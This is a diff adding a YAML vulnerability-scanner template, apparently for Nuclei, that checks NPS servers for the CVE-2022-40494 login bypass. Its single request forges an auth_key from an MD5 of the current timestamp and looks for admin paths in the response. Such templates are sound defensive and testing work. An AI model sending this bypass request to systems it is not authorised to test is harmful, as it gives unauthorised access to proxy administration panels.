@@ -1,0 +1,37 @@
+id: cve-2022-40494
+info:
+  name: NPS Permission Bypass Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    NPS tool has a login bypass vulnerability, allowing attackers to obtain sensitive data and potentially perform further attacks.
+  tags:
+    - permission-bypass
+    - vulnerability
+  classification:
+    cve-id: CVE-2022-40494
+    cvss-score: 9.8
+  reference:
+    - https://github.com/ehang-io/nps/releases
+
+variables:
+  timestamp: '{{unix_time()}}'
+  auth_key: '{{md5(timestamp)}}'
+
+http:
+  - raw:
+      - |
+        GET /Index/Index?auth_key={{auth_key}}&timestamp={{timestamp}} HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "/index/socks5"
+          - "/index/http"
+          - "/client/list"
+        part: body
